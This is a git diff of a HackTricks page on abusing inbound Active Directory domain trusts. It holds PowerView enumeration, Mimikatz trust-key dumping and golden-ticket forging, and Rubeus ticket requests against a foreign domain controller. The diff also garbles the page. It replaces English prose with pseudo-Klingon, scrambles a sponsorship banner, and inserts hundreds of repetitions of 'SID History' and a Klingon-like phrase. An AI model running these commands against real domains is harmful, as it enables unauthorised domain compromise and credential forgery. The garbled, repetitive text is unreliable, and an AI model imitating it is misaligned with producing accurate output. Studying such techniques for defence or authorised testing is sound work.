@@ -18,20 +18,43 @@ In this scenario an external domain is trusting you (or both are trusting each o
 
 First of all, you need to **enumerate** the **trust**:
 
+---
+
+# Qa'leS 'ej Qa'leS (Inbound) yu'bej
+
+<details>
+
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>qaStaHvIS AWS hacking</strong></a><strong>!</strong></summary>
+
+* **cybersecurity company**DaH 'oH **Do you work in**? **company advertised in HackTricks** **want to see your**? **PEASS or download HackTricks in PDF** **access to the latest version of the** **want to have**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **Check the**!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover** [**NFTs**](https://opensea.io/collection/the-peass-family) **our collection of exclusive**.
+* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get the**.
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **or the** [**telegram group**](https://t.me/peass) **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [hacktricks repo](https://github.com/carlospolop/hacktricks) **and** [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud) **.**
+
+</details>
+
+**qaStaHvIS** 'e' vItlhutlh **'ej vItlhutlh** (pagh 'ej vItlhutlh) **'e' vItlhutlh** **external domain** **In this scenario** **trusting you** (pagh **both are trusting each other**), **so you can get some kind of access over it**.
+
+## Enumeration
+
+**'e' vItlhutlh** **enumerate** **need to** **First of all**:
+
+---
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
 TrustType       : WINDOWS-ACTIVE_DIRECTORY
-TrustAttributes : 
+TrustAttributes :
 TrustDirection  : Inbound          --> Inboud trust
 WhenCreated     : 2/19/2021 10:50:56 PM
 WhenChanged     : 2/19/2021 10:50:56 PM
 
 # Get name of DC of the other domain
 Get-DomainComputer -Domain domain.external -Properties DNSHostName
-dnshostname           
------------           
+dnshostname
+-----------
 dc.domain.external
 
 # Groups that contain users outside of its domain and return its members
@@ -42,7 +65,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -64,52 +87,44 @@ SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
 IsGroup      : True
 IsDomain     : True
 
-# You may also enumerate where foreign groups and/or users have been assigned 
+# You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
-
 ## Initial Access
 
 If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
 
 You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
 
+```
+$> Get-DomainUser -Domain external.domain
+```
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
-
-{% content-ref url="./" %}
-[.](./)
-{% endcontent-ref %}
-
 ## Impersonation
 
 ### Logging in
 
 Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
 
+## qawHaq
+
+### qIb
+
+ghItlhvam vItlhutlhlaHbe'chugh vaj qawHaq'e' vItlhutlhlaHbe'chugh vaj:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-
 ### SID History Abuse
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
-
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
-
-{% hint style="warning" %}
-As a reminder, you can get the signing key with
-
+**SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History) **SID History** (SID History)
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
-
+**ghItlh** **trusted** **key** **vItlhutlh** **TGT impersonating** **user** **current domain**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -120,9 +135,11 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+### pIm 'ej QaH jImej
 
-### Full way impersonating the user
+#### QaH
 
+QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e' vItlhutlh. QaH jImej 'e'
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -136,7 +153,6 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
 <details>
 
 <summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
